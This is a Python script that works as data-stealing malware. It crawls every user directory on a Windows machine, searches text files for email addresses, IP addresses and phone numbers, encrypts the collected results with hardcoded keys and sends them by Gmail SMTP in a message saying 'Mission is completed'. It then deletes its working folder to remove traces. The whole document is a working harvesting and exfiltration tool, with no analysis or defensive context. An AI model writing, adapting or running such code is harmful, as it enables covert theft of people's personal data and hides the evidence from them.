import re, os, pathlib, logging, shutil, smtplib
from time import time
from hashlib import sha512
from cryptography.fernet import Fernet
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

def main():
    start = time()
    print('Crawling ...')
    pathlib.Path('C:/Tmp').mkdir(parents=True, exist_ok=True)
    path = 'C:\\Tmp\\'
    re_txt = re.compile(r'.+\.txt$')
    re_email = re.compile(r'^.+@(?:gmail|yahoo|hotmail|aol|msn|live|protonmail)\.com')
    re_ip = re.compile(r'(?:\s|^)[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}')
    re_phone = re.compile(r'(1?)(?:\s|^)[0-9]{3}-[0-9]{3}-[0-9]{4}')

##### Crawler Begins #########################################################################################
    with open(path + 'crawlLog.txt', 'a') as log:
        for dirpath, dirnames, filenames in os.walk('C:\\Users\\', topdown=True):
            log.write('Path => {}\n'.format(dirpath))
            for d in dirnames:
                log.write('Dir => {}\n'.format(d))
            log.write('\n')
            for file in filenames:
                log.write('File => {}\n'.format(file))
                if re_txt.match(file):
                    try:
                        with open(dirpath + '\\' + file) as search_file:
                            for line in search_file:
                                print(line)
                                if re_email.search(line) or re_ip.search(line) or re_phone.search(line):
                                    with open(path + 'crawlMatches.txt', 'a') as details:
                                        details.write('Path => {}\n'.format(dirpath))
                                        details.write('File => {}\n'.format(file))
                                        details.write('Match => {}\n\n'.format(line))

                    except Exception as ex:
                        logging.basicConfig(level=logging.DEBUG, \
                                            filename='C:/Tmp/error_log.txt')
                        logging.exception('* Error Occured: {} *'.format(ex))
                        pass
                        
            log.write('\n')

##### Encrpytion and Hashing #################################################################################
    # Hash, encrypt, and hash encrypted data #
    key = b'UR58Mz1VHiGJa1_W42E4G0FD__Ihb4vevs3wmWhVtOc='
    for dirpath, dirnames, filenames in os.walk(path):
        for file in filenames:
            sha = sha512(str.encode(file))
            with open(path + 'SHA_Hashes.txt', 'a') as hash_plain:
                hash_plain.write('{}\nPlain Text SHA:\n{}\n'.format(file,str(sha)))

            with open(path + file, 'rb') as plain_text:
                data = plain_text.read()
            encrypted = Fernet(key).encrypt(data)

            with open(path + 'e_' + file, 'ab') as encrypted_text:
                encrypted_text.write(encrypted)
            e_sha = sha512(str.encode('e_' + file))

            with open(path + 'SHA_Hashes.txt', 'a') as hash_encrypt:
                hash_encrypt.write('{}\nEncrypted SHA:\n{}\n\n'.format(file,str(e_sha)))      

    # Encrypt file with hashes #
    hash_key = b'AP92lIGyU8Zqnc568KT5ugjInAo28qwBuB5fzWYQfz0='
    with open(path + 'SHA_Hashes.txt', 'rb') as plain_text:
        data = plain_text.read()
    encrypted = Fernet(hash_key).encrypt(data)

    with open(path + 'e_SHA_Hashes.txt', 'ab') as encrypted_text:
        encrypted_text.write(encrypted)

##### Email Encrypted Data ################################################################################### 
    email_address = ''                          # <= Enter email address
    password = ''                               # <= Enter password
    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] =  email_address
    msg['Subject'] = 'Success!!!'
    body = 'Mission is completed'
    msg.attach(MIMEText(body, 'plain'))
    re_email = re.compile(r'^e_.+\.txt$')

    for dirpath, dirnames, filenames in os.walk(path):
        for file in filenames:
            if re_email.match(file):
                p = MIMEBase('application', 'octet-stream')
                with open(path + file, 'rb') as attachment:
                    p.set_payload(attachment.read())
                encoders.encode_base64(p)
                p.add_header('Content-Disposition', 'attachment;'   
                             'filename = {}'.format(file)) 
                msg.attach(p)
            else:
                pass

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(email_address, password)
    s.sendmail(email_address, email_address, msg.as_string())
    s.quit()

##### Shutdown Logging & Cleanup ############################################################################
    logging.shutdown()
    shutil.rmtree('C:\\Tmp')
    print('\nAll Done!!')
    print(time() - start)

if __name__ == '__main__':
    try:
        main()

    except KeyboardInterrupt:
        print('Ctrl+C detected .. exiting')

    except Exception as ex:
        logging.basicConfig(level=logging.DEBUG, \
                            filename='C:/Tmp/error_log.txt')
        logging.exception('* Error Occured: {} *'.format(ex))
        pass